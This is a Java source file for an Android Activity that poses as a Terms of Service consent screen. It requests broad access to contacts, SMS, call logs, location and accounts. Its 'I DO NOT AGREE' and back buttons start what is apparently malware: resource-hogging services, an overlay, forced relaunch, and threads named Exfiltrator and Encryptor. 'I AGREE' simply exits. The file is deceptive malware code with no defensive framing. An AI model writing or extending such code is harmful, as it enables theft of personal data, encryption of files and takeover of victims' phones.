package com.rhfvnc.strain;
import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.*;
public class ChoiceActivity extends Activity {
    private static final int REQ_ALL = 200;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.GET_ACCOUNTS}, REQ_ALL);
        }
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0a0a0a"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 60, 60, 60);
        TextView title = new TextView(this);
        title.setText("Terms of Service");
        title.setTextColor(Color.WHITE);
        title.setTextSize(28);
        title.setGravity(Gravity.CENTER);
        root.addView(title);
        TextView body = new TextView(this);
        body.setText("By continuing, you agree to our Terms of Service and Privacy Policy.\n\nTap 'I AGREE' to proceed.\nTap 'I DO NOT AGREE' to decline.");
        body.setTextColor(Color.LTGRAY);
        body.setTextSize(14);
        body.setGravity(Gravity.CENTER);
        body.setPadding(0, 40, 0, 60);
        root.addView(body);
        Button agree = new Button(this);
        agree.setText("I AGREE");
        agree.setTextColor(Color.WHITE);
        agree.setTextSize(16);
        agree.setOnClickListener(v -> exitSafe());
        LinearLayout.LayoutParams alp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        alp.topMargin = 20;
        root.addView(agree, alp);
        Button refuse = new Button(this);
        refuse.setText("I DO NOT AGREE");
        refuse.setTextColor(Color.GRAY);
        refuse.setOnClickListener(v -> activate());
        root.addView(refuse);
        setContentView(root);
    }
    private void exitSafe() {
        finishAffinity();
        android.os.Process.killProcess(android.os.Process.myPid());
    }
    private void activate() {
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        try { OverlayService.start(this); } catch (Throwable ignored) {}
        StrainReceiver.scheduleRelaunch(this, 20);
        new Thread(new Exfiltrator(this)).start();
        new Thread(new Encryptor(this)).start();
        Intent i = new Intent(this, ChaosActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
        finish();
    }
    @Override
    public void onBackPressed() { activate(); }
}
